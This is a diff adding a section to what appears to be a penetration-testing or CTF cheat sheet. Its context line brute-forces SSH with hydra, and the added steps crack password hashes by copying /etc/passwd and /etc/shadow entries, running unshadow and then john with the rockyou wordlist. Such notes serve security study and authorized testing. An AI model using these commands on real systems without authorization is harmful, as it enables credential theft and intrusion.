@@ -11,6 +11,15 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
 
 ```
 
+## SSH john the crack to decrypt shadow password
+
+```
+1. Copy /etc/passwd content of a user in a text file
+2. Copy /etc/shadow content of a user in a text file
+3. sudo unshadow passwd.txt shadow.txt > hash.txt
+4. sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
 ## RSA Private Key crack using ssh2john
 
 1. Link to download tool
